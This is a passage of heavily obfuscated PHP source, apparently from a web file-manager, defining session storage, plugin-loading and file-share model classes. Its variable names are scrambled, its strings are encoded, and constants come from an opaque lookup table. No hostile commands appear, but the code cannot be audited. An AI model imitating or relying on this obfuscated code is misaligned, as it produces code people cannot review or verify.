call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ó¸Ì„ÅÒ =& $_SERVER[è¶³ÒßÑ]; static $œ’²¬Ãô = false; if ($œ’²¬Ãô) { return $œ’²¬Ãô; } $†“áÑÎ = $GLOBALS[$Ó¸Ì„ÅÒ[6]][$Ó¸Ì„ÅÒ[418]]; self::$sessionTime = $†“áÑÎ[$Ó¸Ì„ÅÒ[1707]]; $åñê›õ = isset($GLOBALS[$Ó¸Ì„ÅÒ[1708]]) ? $GLOBALS[$Ó¸Ì„ÅÒ[1708]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($åñê›õ)) { self::$sessionSign = Cookie::get($åñê›õ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($åñê›õ, self::$sessionSign, self::$sessionTime); $õãÙ½·ú = $†“áÑÎ[$Ó¸Ì„ÅÒ[1709]]; $¦âò²ÇÀ = $†“áÑÎ[$õãÙ½·ú]; $ò§Ü—¯› = $†“áÑÎ[$Ó¸Ì„ÅÒ[881]]; switch ($õãÙ½·ú) { case $Ó¸Ì„ÅÒ[21]: self::$handle = Model($Ó¸Ì„ÅÒ[882]); break; case $Ó¸Ì„ÅÒ[883]: self::$handle = new CacheRedis($¦âò²ÇÀ, $ò§Ü—¯›); break; case $Ó¸Ì„ÅÒ[884]: self::$handle = new CacheMemcached($¦âò²ÇÀ, $ò§Ü—¯›); break; case $Ó¸Ì„ÅÒ[240]: $¦âò²ÇÀ[$Ó¸Ì„ÅÒ[97]] = $¦âò²ÇÀ[$Ó¸Ì„ÅÒ[97]] . $Ó¸Ì„ÅÒ[1710]; self::$handle = new CacheFile($¦âò²ÇÀ, $ò§Ü—¯›); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $œ’²¬Ãô = new self(); return $œ’²¬Ãô; } public static function getBySign($úÃçÅÛİ) { $§ÔÖ­û™ = self::$handle->get($úÃçÅÛİ); $§ÔÖ­û™ = unserialize($§ÔÖ­û™); return is_array($§ÔÖ­û™) ? $§ÔÖ­û™ : array(); } public static function setBySign($ùÓœÔ¤×, $…ßú·‰) { CacheLock::lock($ùÓœÔ¤×); self::$handle->set($ùÓœÔ¤×, serialize($…ßú·‰), self::$sessionTime); CacheLock::unlock($ùÓœÔ¤×); } public static function sign($ï´¸Ñ¨Å = false) { if ($ï´¸Ñ¨Å) { self::$sessionSign = $ï´¸Ñ¨Å; } self::init(); return self::$sessionSign; } public static function set($Ï¾œ…‡, $œ“òÂı = false) { self::init(); if (is_array($Ï¾œ…‡)) { foreach ($Ï¾œ…‡ as $¢İ¢øÄµ => $ûÔŸï‚Ò) { array_set_value(self::$data, $¢İ¢øÄµ, $ûÔŸï‚Ò); } } else { array_set_value(self::$data, $Ï¾œ…‡, $œ“òÂı); } self::setBySign(self::$sessionSign, self::$data); } public static function get($­„Ó”Ø— = false) { self::init(); if (!$­„Ó”Ø—) { return self::$data; } return array_get_value(self::$data, $­„Ó”Ø—); } public static function remove($şê™ğÕ) { self::init(); unset(self::$data[$şê™ğÕ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[è¶³ÒßÑ][887])) { self::$handle->clearTimeout(); } } } goto b¦¾ƒ¢Ø¡¿; E¢™ŠáÙİÌ: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x70\154\x75\x67\x69\156\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\163\x74\x61\164\x75\163", "\162\145\x67\x69\x65\x73\164", "\x63\x6f\x6e\146\x69\147"); public function loadList($É™µ‘Í = false) { $Âƒ…£Ğ¦ = array_to_keyvalue($this->listData(), $_SERVER[è¶³ÒßÑ][32]); if ($É™µ‘Í) { return $Âƒ…£Ğ¦[$É™µ‘Í]; } return $Âƒ…£Ğ¦; } public function init() { $³ëÕÊŞ =& $_SERVER[è¶³ÒßÑ]; Hook::trigger($³ëÕÊŞ[2083]); $”íÓ‹ªç = $this->loadPluginList(); foreach ($”íÓ‹ªç as $œìÆ©Ãü => $Ê¤¾Ä¿) { $ÙÅ²ŸÈ = $this->appAllow($œìÆ©Ãü, $Ê¤¾Ä¿); if (!$ÙÅ²ŸÈ) { continue; } foreach ($Ê¤¾Ä¿[$³ëÕÊŞ[2084]] as $¨„ë§¬ => $°°…œë) { Hook::bind($¨„ë§¬, $°°…œë); } } Hook::trigger($³ëÕÊŞ[2085]); Hook::trigger(ACTION); } public function appAllow($Ï€­¨’, $¯¤«»ñ, $µç¡¶±Ó = true) { $¬“ì¾¡É =& $_SERVER[è¶³ÒßÑ]; $ øéŸ = PLUGIN_DIR . $Ï€­¨’ . $¬“ì¾¡É[2086]; if (!is_array($¯¤«»ñ) || !is_array($¯¤«»ñ[$¬“ì¾¡É[2084]]) || $¯¤«»ñ[$¬“ì¾¡É[804]] != 1 || !is_file($ øéŸ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$¬“ì¾¡É[6]][$¬“ì¾¡É[2087]] || !$GLOBALS[$¬“ì¾¡É[6]][$¬“ì¾¡É[2088]]) { return !0; } $¡Ë‘™Ü = explode($¬“ì¾¡É[50], strtolower($GLOBALS[$¬“ì¾¡É[6]][$¬“ì¾¡É[2088]])); return in_array(strtolower($Ï€­¨’), $¡Ë‘™Ü) ? !1 : !0; } if ($µç¡¶±Ó && !Action($¬“ì¾¡É[2089])->checkAuth($Ï€­¨’)) { return !1; } return !0; } public function unInstall($­èÍ°ã) { $Æ³å†† =& $_SERVER[è¶³ÒßÑ]; $«÷áñò = $this->loadList($­èÍ°ã); if (file_exists(PLUGIN_DIR . $­èÍ°ã)) { Hook::apply($­èÍ°ã . $Æ³å††[2090]); } $this->remove($«÷áñò[$Æ³å††[468]]); } public function changeStatus($ÇÃ€Ò„Ñ, $×Åöù›Ğ) { $ïãÔşÔã =& $_SERVER[è¶³ÒßÑ]; $­ıÄàÌ¹ = $this->loadList($ÇÃ€Ò„Ñ); if ($×Åöù›Ğ) { Hook::apply($ÇÃ€Ò„Ñ . $ïãÔşÔã[2091]); } $this->update($­ıÄàÌ¹[$ïãÔşÔã[468]], array($ïãÔşÔã[2092] => $×Åöù›Ğ)); } public function appRegist($­ş ¡éÌ, $è‰´˜™ì) { $Ú¨Ì„Ş =& $_SERVER[è¶³ÒßÑ]; $¬Ğ¢¸°¢ = $this->loadList($­ş ¡éÌ); if ($¬Ğ¢¸°¢) { $this->update($¬Ğ¢¸°¢[$Ú¨Ì„Ş[468]], array($Ú¨Ì„Ş[2084] => $è‰´˜™ì)); } else { $´çÌœ¦ó = array($Ú¨Ì„Ş[32] => $­ş ¡éÌ, $Ú¨Ì„Ş[2084] => $è‰´˜™ì, $Ú¨Ì„Ş[804] => 0, $Ú¨Ì„Ş[6] => $this->getConfigDefault($­ş ¡éÌ)); $this->insert($´çÌœ¦ó); } } public function getConfigDefault($éìùé‰¢) { $Úî²’ˆß =& $_SERVER[è¶³ÒßÑ]; $¬şØ†ü = array(); $·ËóÑšó = $this->getPackageJson($éìùé‰¢); if (!$·ËóÑšó && is_array($·ËóÑšó[$Úî²’ˆß[2093]])) { return $¬şØ†ü; } foreach ($·ËóÑšó[$Úî²’ˆß[2093]] as $¬ÅèÁÔ => $Â£»Èı£) { if (!isset($Â£»Èı£[$Úî²’ˆß[443]]) || isset($¬şØ†ü[$¬ÅèÁÔ])) { continue; } $¬şØ†ü[$¬ÅèÁÔ] = $Â£»Èı£[$Úî²’ˆß[443]]; } return $¬şØ†ü; } public function getPackageJson($Ó•‡ñ) { return Hook::apply($Ó•‡ñ . $_SERVER[è¶³ÒßÑ][2094]); } public function getConfig($ö´ç‘‘å, $ıÑğàë = false) { $Íö£ïäı =& $_SERVER[è¶³ÒßÑ]; $¥ÈûúŞœ = array(); $†¹ï‰ı = $this->loadList($ö´ç‘‘å); if ($†¹ï‰ı && is_array($†¹ï‰ı[$Íö£ïäı[6]])) { $¥ÈûúŞœ = $†¹ï‰ı[$Íö£ïäı[6]]; } if (!$¥ÈûúŞœ || $ıÑğàë) { $¥ÈûúŞœ = $this->getConfigDefault($ö´ç‘‘å); } return $¥ÈûúŞœ; } public function setConfig($î…ğ¼Õà, $™°ÓÈ× = false) { $É®¿á€Î =& $_SERVER[è¶³ÒßÑ]; $Ä¦·Ê¿Û = $this->loadList($î…ğ¼Õà); if (!$Ä¦·Ê¿Û) { return !1; } $ÏÖÕëÕæ = $Ä¦·Ê¿Û[$É®¿á€Î[6]]; if ($™°ÓÈ× == !1) { $ÏÖÕëÕæ = array(); $™°ÓÈ× = $this->getConfigDefault($î…ğ¼Õà); } foreach ($™°ÓÈ× as $ºà°Úš× => $ı­õ†Õ±) { $ÏÖÕëÕæ[$ºà°Úš×] = is_string($ı­õ†Õ±) ? trim($ı­õ†Õ±) : $ı­õ†Õ±; } $this->update($Ä¦·Ê¿Û[$É®¿á€Î[468]], array($É®¿á€Î[6] => $ÏÖÕëÕæ)); } public function viewList() { $¦õÕå Ë =& $_SERVER[è¶³ÒßÑ]; $ÍèØ = $this->loadList(); $this->pluginScan($ÍèØ); $ÍèØ = $this->loadPluginList(); $ÕÍË£Ç“ = array(); foreach ($ÍèØ as $ò•èÌ¢ƒ => $ù¨”§Ü) { $£šéÆ ª = $ù¨”§Ü; unset($ù¨”§Ü[$¦õÕå Ë[2084]], $ù¨”§Ü[$¦õÕå Ë[6]]); $á‹šğ©± = PLUGIN_DIR . $ù¨”§Ü[$¦õÕå Ë[32]] . $¦õÕå Ë[2086]; if (!is_file($á‹šğ©±)) { continue; } $çŞ…Úš™ = Hook::apply($ù¨”§Ü[$¦õÕå Ë[32]] . $¦õÕå Ë[2094]); if (!is_array($çŞ…Úš™)) { continue; } $ÕÍË£Ç“[$ò•èÌ¢ƒ] = array_merge($ù¨”§Ü, $çŞ…Úš™); if ($£šéÆ ª[$¦õÕå Ë[6]][$¦õÕå Ë[1675]] != $çŞ…Úš™[$¦õÕå Ë[1649]]) { Hook::apply($ù¨”§Ü[$¦õÕå Ë[32]] . $¦õÕå Ë[2091]); $£šéÆ ª[$¦õÕå Ë[6]][$¦õÕå Ë[1675]] = $çŞ…Úš™[$¦õÕå Ë[1649]]; $this->update($ù¨”§Ü[$¦õÕå Ë[468]], array($¦õÕå Ë[6] => $£šéÆ ª[$¦õÕå Ë[6]])); } } return $ÕÍË£Ç“; } private function loadPluginList() { $…ıÅŞ²¦ =& $_SERVER[è¶³ÒßÑ]; $°¯úš‚ş = $this->loadList(); if (strtolower(MOD) == $…ıÅŞ²¦[2095]) { return $°¯úš‚ş; } $ó‘ÄŒƒš = Hook::trigger($…ıÅŞ²¦[2096], $°¯úš‚ş); if ($°¯úš‚ş && !$ó‘ÄŒƒš) { die; } return $ó‘ÄŒƒš ? $ó‘ÄŒƒš : $°¯úš‚ş; } private function pluginScan($ÎĞ”‹Ÿ) { $ı²ş˜±Ì =& $_SERVER[è¶³ÒßÑ]; recursion_dir(PLUGIN_DIR, $õ©›ˆ¹™, $¥ÜÅÖ¥, 0); foreach ($õ©›ˆ¹™ as $­ˆãé—Õ) { $·İ‰êî¶ = get_path_this($­ˆãé—Õ); if (isset($ÎĞ”‹Ÿ[$·İ‰êî¶]) || !file_exists($­ˆãé—Õ . $ı²ş˜±Ì[2097]) || !file_exists($­ˆãé—Õ . $ı²ş˜±Ì[2086])) { continue; } Hook::apply($·İ‰êî¶ . $ı²ş˜±Ì[2091]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\137\x73\145\163\163\151\157\x6e"; public function get($Í”ª´) { $Ï¢–ÌĞ =& $_SERVER[è¶³ÒßÑ]; $à«’²ª÷ = $this->where(array($Ï¢–ÌĞ[2098] => $Í”ª´))->find(); if (!is_array($à«’²ª÷)) { return !1; } return $à«’²ª÷[$Ï¢–ÌĞ[181]]; } public function set($…ğº¢Â, $™¬öªÑ†, $ÚşŒÃ…– = 3600) { $ëê™½Úê =& $_SERVER[è¶³ÒßÑ]; $œ¥‡•úÏ = array($ëê™½Úê[2098] => $…ğº¢Â, $ëê™½Úê[1998] => $™¬öªÑ†, $ëê™½Úê[2099] => $ÚşŒÃ…– + time()); if (Session::get($ëê™½Úê[2100])) { $œ¥‡•úÏ[$ëê™½Úê[1761]] = Session::get($ëê™½Úê[2100]); } else { $œ¥‡•úÏ[$ëê™½Úê[1761]] = 0; } if ($this->get($…ğº¢Â)) { return $this->where(array($ëê™½Úê[2098] => $…ğº¢Â))->save($œ¥‡•úÏ); } else { return $this->add($œ¥‡•úÏ, array(), !0); } } public function remove($Ø´ãóÇ“) { return $this->where(array($_SERVER[è¶³ÒßÑ][2098] => $Ø´ãóÇ“))->delete(); } public function clearTimeout() { return $this->where($_SERVER[è¶³ÒßÑ][2101] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\145"; protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\151\155\x65", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\x72\x74\x2c\165\160\x64\141\164\145", "\x66\165\156\x63\x74\151\x6f\156"), array("\143\162\145\141\x74\145\x54\151\x6d\145", "\x74\151\x6d\x65", "\151\156\x73\145\162\164", "\146\x75\156\x63\164\151\x6f\x6e"), array("\157\160\x74\151\x6f\x6e\163", '', "\x69\156\x73\x65\162\x74\54\x75\x70\x64\x61\x74\x65\x2c\x73\145\154\145\143\x74", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($¡ã×Òú¾) { $»®÷²óÜ =& $_SERVER[è¶³ÒßÑ]; $ˆÓ½Îƒø = isset($¡ã×Òú¾[0]) ? $¡ã×Òú¾[0] : !1; return array($»®÷²óÜ[2102] => array(USER_ID, $»®÷²óÜ[2103]), $»®÷²óÜ[2043] => array($ˆÓ½Îƒø, $»®÷²óÜ[2104])); } protected function listSimple() { $¤¼Úß°¤ = array($_SERVER[è¶³ÒßÑ][1761] => USER_ID); $§âõÄ÷à = $this->field($this->fieldList)->where($¤¼Úß°¤)->select(); return $§âõÄ÷à ? $§âõÄ÷à : array(); } protected function getInfo($ÅÈ×ºÛà, $…¥¯úÅ = false) { $úÚöÕˆÀ =& $_SERVER[è¶³ÒßÑ]; if ($…¥¯úÅ) { return $this->_getShareInfo(array($úÚöÕˆÀ[658] => $ÅÈ×ºÛà)); } $íĞæÆŠİ = $this->cacheFunctionGet($úÚöÕˆÀ[2045], $ÅÈ×ºÛà); return $íĞæÆŠİ; } public function getInfoByHash($Ö…‰…İ‡) { return $this->_getShareInfo(array($_SERVER[è¶³ÒßÑ][2105] => $Ö…‰…İ‡)); } public function getInfoByPath($ ƒ÷ÅÕü) { $ãÜ®ÓĞ§ =& $_SERVER[è¶³ÒßÑ]; $è“ÖšĞØ = array($ãÜ®ÓĞ§[1761] => USER_ID, $ãÜ®ÓĞ§[203] => $ ƒ÷ÅÕü); return $this->_getShareInfo($è“ÖšĞØ); } public function getInfoBySourcePath($©Áã•ÃÁ) { $Ê…ûüÀÙ =& $_SERVER[è¶³ÒßÑ]; $Î×…µ±µ = array($Ê…ûüÀÙ[1761] => USER_ID, $Ê…ûüÀÙ[1232] => $©Áã•ÃÁ); return $this->_getShareInfo($Î×…µ±µ); } private function _getShareInfo($šÔêïÈ) { $âüÚ†ß‹ =& $_SERVER[è¶³ÒßÑ]; $ÆÈëÂà³ = $this->where($šÔêïÈ)->find(); if (!$ÆÈëÂà³) { return !1; } $šÔêïÈ = array($âüÚ†ß‹[658] => $ÆÈëÂà³[$âüÚ†ß‹[658]]); $Áû†¥ì = $âüÚ†ß‹[2106]; $ªó˜Û… = Model($âüÚ†ß‹[659])->order($âüÚ†ß‹[468])->field($Áû†¥ì)->where($šÔêïÈ)->select(); if ($ÆÈëÂà³[$âüÚ†ß‹[203]] == $âüÚ†ß‹[238]) { $ÆÈëÂà³[$âüÚ†ß‹[100]] = IO::info($ÆÈëÂà³[$âüÚ†ß‹[1232]]); } else { $ÆÈëÂà³[$âüÚ†ß‹[100]] = Model($âüÚ†ß‹[1395])->pathInfo($ÆÈëÂà³[$âüÚ†ß‹[203]]); } $ÆÈëÂà³[$âüÚ†ß‹[2107]] = $ªó˜Û…; return $ÆÈëÂà³; } protected function getInfoAuth($©øôİ˜­) { $˜ëÌı¡œ =& $_SERVER[è¶³ÒßÑ]; $øÂïµÜ¨ = $this->getInfo($©øôİ˜­); if ($øÂïµÜ¨[$˜ëÌı¡œ[1761]] == USER_ID) { $øÂïµÜ¨[$˜ëÌı¡œ[480]] = $øÂïµÜ¨[$˜ëÌı¡œ[100]][$˜ëÌı¡œ[480]]; } else { $øÂïµÜ¨[$˜ëÌı¡œ[480]] = Model($˜ëÌı¡œ[560])->authMake($øÂïµÜ¨[$˜ëÌı¡œ[2107]]); } return $øÂïµÜ¨; } protected function listData($İÑô§ƒ¿ = null, $šÑŒè–å = 300) { $¾å°üµº =& $_SERVER[è¶³ÒßÑ]; $é×ÈÁèã = array(array($¾å°üµº[555] => array($¾å°üµº[1065], 0), $¾å°üµº[656] => array($¾å°üµº[1065], 0), $¾å°üµº[2108] => $¾å°üµº[2061])); if ($İÑô§ƒ¿ == $¾å°üµº[2109]) { $é×ÈÁèã = array($¾å°üµº[555] => 1); } else { if ($İÑô§ƒ¿ == $¾å°üµº[1217]) { $é×ÈÁèã = array($¾å°üµº[656] => 1); } } $é×ÈÁèã[$¾å°üµº[1761]] = USER_ID; $à†µŸ¿ = $this->where($é×ÈÁèã)->selectPage($šÑŒè–å); return $à†µŸ¿; } protected function listToMe($ªøß†Â = 300) { $Ûğ…òü› =& $_SERVER[è¶³ÒßÑ]; $·øÆ¢ƒ = Model($Ûğ…òü›[2110])->userGroupParents(USER_ID); $Ò»‘æ³ = array($Ûğ…òü›[641] => SourceModel::TYPE_USER, $Ûğ…òü›[562] => USER_ID); if ($·øÆ¢ƒ) { $Ò»‘æ³ = array(array($Ûğ…òü›[641] => SourceModel::TYPE_USER, $Ûğ…òü›[562] => USER_ID), array($Ûğ…òü›[641] => SourceModel::TYPE_GROUP, $Ûğ…òü›[562] => array($Ûğ…òü›[7], $·øÆ¢ƒ)), $Ûğ…òü›[2108] => $Ûğ…òü›[2061]); } $„¯Ó¾â = Model($Ûğ…òü›[659])->where($Ò»‘æ³)->selectPage($ªøß†Â); $ÀÒÜ»´ò = array_to_keyvalue_group($„¯Ó¾â[$Ûğ…òü›[438]], $Ûğ…òü›[658]); if (!$ÀÒÜ»´ò) { return $„¯Ó¾â; } $ˆäÍ¬áˆ = $Ûğ…òü›[2111]; $Ò»‘æ³ = array($Ûğ…òü›[658] => array($Ûğ…òü›[485], array_keys($ÀÒÜ»´ò)), $Ûğ…òü›[1761] => array($Ûğ…òü›[1067], $Ûğ…òü›[238])); $Åˆ­ı†§ = $this->field($ˆäÍ¬áˆ)->where($Ò»‘æ³)->select(); foreach ($Åˆ­ı†§ as $‡ì‰Ì¸£ => &$ñ¡„Ä·) { $ñ¡„Ä·[$Ûğ…òü›[2107]] = $ÀÒÜ»´ò[$ñ¡„Ä·[$Ûğ…òü›[658]]]; } unset($ñ¡„Ä·); $¨ÒÁ¸ôÃ = array($Ûğ…òü›[2112] => $Åˆ­ı†§, $Ûğ…òü›[2113] => $„¯Ó¾â[$Ûğ…òü›[435]]); return $¨ÒÁ¸ôÃ; } protected function shareAdd($øñÇáõœ, $’Áø†¤—) { $¸—õ³ =& $_SERVER[è¶³ÒßÑ]; $œ¼—Ú² = $this->_addShareData($øñÇáõœ, $’Áø†¤—); if (!empty($’Áø†¤—[$¸—õ³[2114]])) { $this->_shareAuthSet($œ¼—Ú², $’Áø†¤—[$¸—õ³[2114]]); } $this->shareEventAdd($øñÇáõœ, $’Áø†¤—, $¸—õ³[2115]); return $œ¼—Ú²; } protected function shareAddSystem($Ìì¢ÜÛ§, $íï”•Ù) { $¤ÊÔœ°ì =& $_SERVER[è¶³ÒßÑ]; $÷“†ÁÛ = $this->_addShareData($Ìì¢ÜÛ§, $íï”•Ù, $¤ÊÔœ°ì[201]); $this->_shareAuthSet($÷“†ÁÛ, $íï”•Ù[$¤ÊÔœ°ì[2114]]); return $÷“†ÁÛ; } private function shareEventAdd($ñâ¡–°–, $öİÖÜ±ğ, $úˆÆ•¡‘ = "\x61\x64\144") { $âœö¢ÚÀ =& $_SERVER[è¶³ÒßÑ]; if (!$ñâ¡–°– || $ñâ¡–°– == $âœö¢ÚÀ[238]) { return; } if ($úˆÆ•¡‘ == $âœö¢ÚÀ[2115]) { if ($öİÖÜ±ğ[$âœö¢ÚÀ[555]] == $âœö¢ÚÀ[101]) { Model($âœö¢ÚÀ[626])->eventShare($ñâ¡–°–, $âœö¢ÚÀ[2116]); } if ($öİÖÜ±ğ[$âœö¢ÚÀ[656]] == $âœö¢ÚÀ[101]) { Model($âœö¢ÚÀ[626])->eventShare($ñâ¡–°–, $âœö¢ÚÀ[2117]); } return; } $ê û·¯” = $this->getInfoByPath($ñâ¡–°–); $·ÍíàÒş = $âœö¢ÚÀ[2118]; if ($ê û·¯”[$âœö¢ÚÀ[555]] == $âœö¢ÚÀ[238] && $öİÖÜ±ğ[$âœö¢ÚÀ[555]] == $âœö¢ÚÀ[101]) { $·ÍíàÒş = $âœö¢ÚÀ[2116]; } if ($ê û·¯”[$âœö¢ÚÀ[555]] == $âœö¢ÚÀ[101] && $öİÖÜ±ğ[$âœö¢ÚÀ[555]] == $âœö¢ÚÀ[238]) { $·ÍíàÒş = $âœö¢ÚÀ[2119]; } if ($ê û·¯”[$âœö¢ÚÀ[656]] == $âœö¢ÚÀ[238] && $öİÖÜ±ğ[$âœö¢ÚÀ[656]] == $âœö¢ÚÀ[101]) { $·ÍíàÒş = $âœö¢ÚÀ[2117]; } if ($ê û·¯”[$âœö¢ÚÀ[656]] == $âœö¢ÚÀ[101] && $öİÖÜ±ğ[$âœö¢ÚÀ[656]] == $âœö¢ÚÀ[238]) { $·ÍíàÒş = $âœö¢ÚÀ[2120]; } Model($âœö¢ÚÀ[626])->eventShare($ñâ¡–°–, $·ÍíàÒş); return; } private function _addShareData($ó½Ì¬ûÌ, $ùƒ‰ï¯… = array(), $‹ÈÃüô¬ = false) { $û²È× =& $_SERVER[è¶³ÒßÑ]; $‰¨íá†ã = $‹ÈÃüô¬ == $û²È×[201] ? 0 : USER_ID; $öğ¿¡ß = array($û²È×[484] => $ó½Ì¬ûÌ, $û²È×[1752] => $‰¨íá†ã); if ($ó½Ì¬ûÌ == 0) { $öğ¿¡ß = array($û²È×[2121] => $ùƒ‰ï¯…[$û²È×[1232]], $û²È×[1752] => $‰¨íá†ã); } if ($ƒğ†÷ = $this->where($öğ¿¡ß)->find()) { return $ƒğ†÷[$û²È×[658]]; } if ($ó½Ì¬ûÌ == 0) { $Åëğ¥Òü = array($û²È×[32] => get_path_this($ùƒ‰ï¯…[$û²È×[97]])); } else { $Åëğ¥Òü = Model($û²È×[878])->sourceInfo($ó½Ì¬ûÌ); if (!$Åëğ¥Òü) { return !1; } } if (!$ùƒ‰ï¯…[$û²È×[1650]]) { $ùƒ‰ï¯…[$û²È×[1650]] = $Åëğ¥Òü[$û²È×[32]]; } $ÚÒŸÛÀ« = array($û²È×[1752] => $‰¨íá†ã, $û²È×[484] => $ó½Ì¬ûÌ, $û²È×[1650] => $û²È×[12], $û²È×[555] => 0, $û²È×[656] => 0, $û²È×[1232] => $û²È×[12], $û²È×[376] => $û²È×[12], $û²È×[942] => $û²È×[12], $û²È×[2122] => 0, $û²È×[2123] => 0, $û²È×[815] => 0, $û²È×[2124] => $û²È×[12], $û²È×[2105] => $û²È×[12]); $·æáŒé = explode($û²È×[50], $û²È×[2125]); foreach ($·æáŒé as $Ğá„ÌÀ) { if (!isset($ùƒ‰ï¯…[$Ğá„ÌÀ])) { continue; } $ÚÒŸÛÀ«[$Ğá„ÌÀ] = $ùƒ‰ï¯…[$Ğá„ÌÀ]; } $Àâ½Œ‰ù = $this->add($ÚÒŸÛÀ«); $ºƒ³ï§½ = array($û²È×[2105] => short_id($Àâ½Œ‰ù)); $this->where(array($û²È×[2126] => $Àâ½Œ‰ù))->save($ºƒ³ï§½); return $Àâ½Œ‰ù; } private function _shareAuthSet($Š³áÓò, $ŠÖ„ôÉ‹) { $Ï³¼Ê =& $_SERVER[è¶³ÒßÑ]; if (!is_array($ŠÖ„ôÉ‹)) { return !1; } $¬©Š±ÊÆ = Model($Ï³¼Ê[2071]); $¬©Š±ÊÆ->where(array($Ï³¼Ê[658] => $Š³áÓò))->delete(); $¥Æ¤Ÿªø = array(); foreach ($ŠÖ„ôÉ‹ as $¥‘‘€») { $¥è¨¥¾ö = SourceModel::TYPE_USER; if ($¥‘‘€»[$Ï³¼Ê[200]] == SourceModel::TYPE_GROUP) { $¥è¨¥¾ö = SourceModel::TYPE_GROUP; } $Ÿ÷Üì¡ = array($Ï³¼Ê[658] => $Š³áÓò, $Ï³¼Ê[200] => $¥è¨¥¾ö, $Ï³¼Ê[562] => intval($¥‘‘€»[$Ï³¼Ê[562]]), $Ï³¼Ê[2067] => 0, $Ï³¼Ê[2127] => -1); if ($¥‘‘€»[$Ï³¼Ê[2067]]) { $Ÿ÷Üì¡[$Ï³¼Ê[2067]] = $¥‘‘€»[$Ï³¼Ê[2067]]; } else { if ($¥‘‘€»[$Ï³¼Ê[2127]]) { $Ÿ÷Üì¡[$Ï³¼Ê[2127]] = $¥‘‘€»[$Ï³¼Ê[2127]]; } } $¥Æ¤Ÿªø[] = $Ÿ÷Üì¡; } return $¬©Š±ÊÆ->addAll($¥Æ¤Ÿªø, array(), !0); } public function numViewAdd($ı”µ²×ä) { $ªâéšÇ“ =& $_SERVER[è¶³ÒßÑ]; $ê¾»í­ = array($ªâéšÇ“[2126] => $ı”µ²×ä); $this->where($ê¾»í­)->setAdd($ªâéšÇ“[2122]); } public function numDownloadAdd($ş¬áÍË) { $¥Ã–ğÊ÷ =& $_SERVER[è¶³ÒßÑ]; $®Ë“®¿ = array($¥Ã–ğÊ÷[2126] => $ş¬áÍË); $this->where($®Ë“®¿)->setAdd($¥Ã–ğÊ÷[2123]); } protected function shareEdit($º±µ«î˜, $»­³‚ŞØ) { $¨î¼´îÉ =& $_SERVER[è¶³ÒßÑ]; $ÙÍ—•à¼ = $this->getInfo($º±µ«î˜); if (!$ÙÍ—•à¼) { return !1; } $this->_checkLinkShare($»­³‚ŞØ, $ÙÍ—•à¼); $²ê¤»®† = array(); $›ş§‘í— = explode($¨î¼´îÉ[50], $¨î¼´îÉ[2128]); foreach ($›ş§‘í— as $¼ÅÛ—´Î) { if (!array_key_exists($¼ÅÛ—´Î, $»­³‚ŞØ)) { continue; } $²ê¤»®†[$¼ÅÛ—´Î] = $»­³‚ŞØ[$¼ÅÛ—´Î]; } $this->shareEventAdd($ÙÍ—•à¼[$¨î¼´îÉ[203]], $»­³‚ŞØ, $¨î¼´îÉ[1929]); $this->where(array($¨î¼´îÉ[2126] => $º±µ«î˜))->save($²ê¤»®†); if (isset($»­³‚ŞØ[$¨î¼´îÉ[2114]])) { $this->_shareAuthSet($º±µ«î˜, $»­³‚ŞØ[$¨î¼´îÉ[2114]]); } return !0; } private function _checkLinkShare($ßÒ»—Š, $›‘ÅÔ×à) { $Êàˆ¢šÅ =& $_SERVER[è¶³ÒßÑ]; if ($ßÒ»—Š[$Êàˆ¢šÅ[555]] != $Êàˆ¢šÅ[101]) { return; } $á¯úÃŠ¯ = $›‘ÅÔ×à[$Êàˆ¢šÅ[100]][$Êàˆ¢šÅ[203]]; if ($›‘ÅÔ×à[$Êàˆ¢šÅ[100]][$Êàˆ¢šÅ[33]] != $Êàˆ¢šÅ[240]) { $õ€¦Áš÷ = $this->_folderReport($á¯úÃŠ¯); if (!$õ€¦Áš÷) { return; } show_json(LNG($Êàˆ¢šÅ[2129]) . $Êàˆ¢šÅ[2130] . $õ€¦Áš÷, !1); } $Õ²ãÏ¾¤ = Model($Êàˆ¢šÅ[878])->fileInfoGet($›‘ÅÔ×à[$Êàˆ¢šÅ[100]][$Êàˆ¢šÅ[203]]); if (!$Õ²ãÏ¾¤) { return; } $‰ùğàİ¼ = $this->shareFileMeta($Õ²ãÏ¾¤[$Êàˆ¢šÅ[534]]); if (isset($‰ùğàİ¼[$Êàˆ¢šÅ[443]]) && $‰ùğàİ¼[$Êàˆ¢šÅ[443]] == $Êàˆ¢šÅ[101]) { show_json(LNG($Êàˆ¢šÅ[2131]), !1); } } private function _folderReport($–Çóª¹) { $±šåŠ• =& $_SERVER[è¶³ÒßÑ]; $úßò˜Õ‚ = array($±šåŠ•[534] => array($±šåŠ•[1065], 0), $±šåŠ•[804] => 3); $ìÕİÄ— = Model($±šåŠ•[2132])->where($úßò˜Õ‚)->field($±šåŠ•[534])->select(); if (!$ìÕİÄ—) { return !1; } $ìÕİÄ— = array_to_keyvalue($ìÕİÄ—, $±šåŠ•[12], $±šåŠ•[534]); $ë“úá © = $±šåŠ•[50] . $–Çóª¹ . $±šåŠ•[50]; $úßò˜Õ‚ = array($±šåŠ•[534] => array($±šåŠ•[7], $ìÕİÄ—), $±šåŠ•[577] => array($±šåŠ•[452], "\45{$ë“úá ©}\x25"), $±šåŠ•[498] => 0); $Š¡–§¤ = Model($±šåŠ•[878])->where($úßò˜Õ‚)->field($±šåŠ•[2133])->find(); if (!$Š¡–§¤) { return !1; } $àüÙ Á = substr($Š¡–§¤[$±šåŠ•[577]], 